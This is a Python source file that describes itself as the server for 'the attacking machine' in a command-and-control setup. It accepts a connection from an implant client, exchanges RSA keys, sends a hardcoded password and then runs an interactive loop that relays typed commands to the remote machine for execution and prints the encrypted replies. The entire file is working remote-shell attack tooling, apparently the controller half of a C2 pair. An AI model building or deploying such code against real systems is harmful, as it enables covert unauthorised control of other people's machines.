# server.py - For the attacking machine

import socket

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

import configuration as config  # Import configuration file

# CONSTANTS & GLOBALS
ADDRESS = (config.INTERNAL_SERVER_ADDR, config.SERVER_PORT)
BACKLOG = 5  # Max number of queued connections, system-dependent

########################
# CODE BEGINS
########################

# Create a socket to listen to incoming connections
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Bind it to the server address and port
server_socket.bind(ADDRESS)
server_socket.listen(BACKLOG)

print("Server now listening at on port %s" % (ADDRESS[1]))

# Accept a connection
connection_socket, client_addr = server_socket.accept()
print("Connected to %s on port %s" % (client_addr[0], client_addr[1]))

# Create RSA key pair
server_key = RSA.generate(config.KEY_SIZE)
server_public_key = server_key.publickey()
decrypt_cipher = PKCS1_OAEP.new(server_key)

# Send the server's public key
connection_socket.send(server_public_key.exportKey())

# Receive the client's public key
client_public_key = RSA.importKey(connection_socket.recv(config.PAYLOAD_SIZE))
encrypt_cipher = PKCS1_OAEP.new(client_public_key)

def encrypt_and_send(message):
    encrypted_message = encrypt_cipher.encrypt(message.encode())
    connection_socket.send(encrypted_message)

def receive_and_decrypt():
    encrypted_message = connection_socket.recv(config.PAYLOAD_SIZE)
    message = decrypt_cipher.decrypt(encrypted_message).decode()
    return message

# Send over the password for the client (only one client, o.w. we'd use diff passwords)
password = "c2password"
encrypt_and_send(password)

# Server REPL loop - run the interactive shell
while True:
    # Read in command from input
    command = input(":3 ")
    # Note: break out of loop if the command was 'exit' or 'hangup'
    stripped_cmd = command.strip().lower()
    if stripped_cmd == "exit" or stripped_cmd == "hangup":
        # Tell the client to shut down, end server program
        encrypt_and_send(stripped_cmd)
        # TODO should I really end the server program? how to get back in touch, then?
        break
    # Execute the command on the remote machine (client)
    encrypt_and_send(command)
    # Print the results
    decrypted_results = receive_and_decrypt()
    print(decrypted_results)
